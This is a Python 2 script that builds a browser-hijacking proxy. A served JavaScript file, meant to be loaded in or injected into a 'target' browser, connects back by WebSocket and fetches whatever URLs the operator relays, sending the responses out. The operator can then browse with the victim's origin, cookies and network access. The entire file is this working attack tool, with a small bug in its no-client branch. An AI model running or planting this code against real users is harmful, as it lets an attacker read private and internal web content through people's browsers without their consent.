#!/usr/bin/env python
import cherrypy
from cherrypy._cpserver import Server
from ws4py.server.cherrypyserver import WebSocketPlugin, WebSocketTool
from ws4py.websocket import WebSocket
from time import sleep
import BaseHTTPServer
import argparse

socket = None
reply = None

PROXY_JS = """\
var connection = new WebSocket('ws://{}/ws');

connection.onerror = function (error) {{
  console.log('WebSocket Error ' + error);
}};

connection.onmessage = function (e) {{
  var query = e.data;
  console.log(query);
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {{
    if (xhr.readyState == 4) {{
        connection.send(xhr.responseText);
    }}
  }}
  xhr.open("GET",query,false);
  xhr.send();
}};
"""

class Root(object):
    @cherrypy.expose
    def runproxy(self):
        return '<script src="/proxy.js"></script>'

    @cherrypy.expose
    def proxy_js(self):
        cherrypy.response.headers['Content-Type'] = 'text/javascript'
        host = cherrypy.request.headers['Host']
        print host
        return PROXY_JS.format(host)

    @cherrypy.expose
    def ws(self):
        handler = cherrypy.request.ws_handler

class ProxyWebSocket(WebSocket):
    def opened(self):
        global socket
        socket = self
    def closed(self, code, reason=None):
        global socket
        socket = None
    def received_message(self, message):
        global reply
        reply = message.data

class ProxyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def _write_html(self, html):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(html)
    def do_GET(self):
        global reply
        assert reply == None
        if socket == None:
            self._write_html("No client connected")
        socket.send(self.path, False)
        while reply == None:
            sleep(0.1)
        ret = reply
        reply = None
        self._write_html(ret)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HTTP proxy between two clients using websockets. To connect the target, visit http://domain:targetport/runproxy or include http://domain:targetport/proxy.js')
    parser.add_argument('--targetport', default='18082', type=int)
    parser.add_argument('--proxyport', default='18083', type=int)
    args = parser.parse_args()

    cherrypy.config.update({'server.socket_port': args.targetport})
    WebSocketPlugin(cherrypy.engine).subscribe()
    cherrypy.tools.websocket = WebSocketTool()
    cherrypy.tree.mount(Root(), '/', config={'/ws': {'tools.websocket.on': True,
        'tools.websocket.handler_cls': ProxyWebSocket}})

    httpd = BaseHTTPServer.HTTPServer(('', args.proxyport), ProxyHandler)

    cherrypy.engine.start()

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass

    cherrypy.engine.stop()
    httpd.server_close()
